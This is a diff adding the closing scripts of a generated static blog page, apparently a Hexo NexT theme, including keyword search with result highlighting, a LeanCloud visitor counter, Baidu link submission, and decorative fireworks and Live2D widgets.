+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("TSaUMM9qwI423iWuECxQWDDh-gzGzoHsz", "2DucY6TQAx8iNNnjFYelMbXV");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+  
+
+  
+
+  
+  <script type="text/javascript" src="/js/src/exturl.js?v=5.1.4"></script>
+
+
+  
+  
+ <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+ <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+ <script type="text/javascript" src="/js/src/fireworks.js"></script>
+
+
+<div class="bg_content">
+<canvas id="canvas"></canvas>
+</div>
+<!-- 雪花特效 -->
+<!--<script type="text/javascript">
+
+    document.write('<script type="text/javascript" src="/js/src/snow2.js"><\/script>');
+
+</script>-->
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"left","width":100,"height":200},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/src/dynamic_bg.js"></script>
